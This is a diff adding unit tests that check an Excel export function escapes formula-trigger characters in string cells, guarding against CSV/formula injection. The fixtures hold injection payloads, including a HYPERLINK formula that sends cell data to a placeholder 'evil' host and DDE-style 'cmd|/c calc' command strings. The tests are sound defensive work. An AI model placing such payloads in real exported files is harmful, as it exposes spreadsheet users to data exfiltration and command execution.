@@ -118,4 +118,42 @@ describe("exportToExcel", () => {
     expect(writeBuffer).toHaveBeenCalledOnce();
     expect(document.body.appendChild).toHaveBeenCalledOnce();
   });
+
+  it("neutralises CSV/Excel formula triggers in string cells", async () => {
+    const { exportToExcel } = await import("@/lib/export");
+    const headers = ["Contador", "Nota", "Endereco", "Tipo", "Padded", "Score"];
+    const rows: ExportRow[] = [{
+      Contador: "=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
+      Nota: "+1234567",
+      Endereco: "-cmd|/c calc",
+      Tipo: "@SUM(A1:A2)",
+      // Leading whitespace + formula char must still be neutralised — sanitiser
+      // calls trimStart() before checking, so the formula prefix is detected
+      // even when smuggled behind a tab.
+      Padded: "\t=cmd|/c calc",
+      Score: 85,
+    }];
+
+    await exportToExcel("test", headers, rows);
+
+    expect(addRow).toHaveBeenNthCalledWith(2, [
+      "'=HYPERLINK(\"https://evil/?d=\"&A2,\"x\")",
+      "'+1234567",
+      "'-cmd|/c calc",
+      "'@SUM(A1:A2)",
+      "'\t=cmd|/c calc",
+      // Numbers are passed through untouched.
+      85,
+    ]);
+  });
+
+  it("does not modify benign string cells", async () => {
+    const { exportToExcel } = await import("@/lib/export");
+    const headers = ["Nome", "Morada"];
+    const rows: ExportRow[] = [{ Nome: "Maria João", Morada: "Rua das Flores 12" }];
+
+    await exportToExcel("test", headers, rows);
+
+    expect(addRow).toHaveBeenNthCalledWith(2, ["Maria João", "Rua das Flores 12"]);
+  });
 });
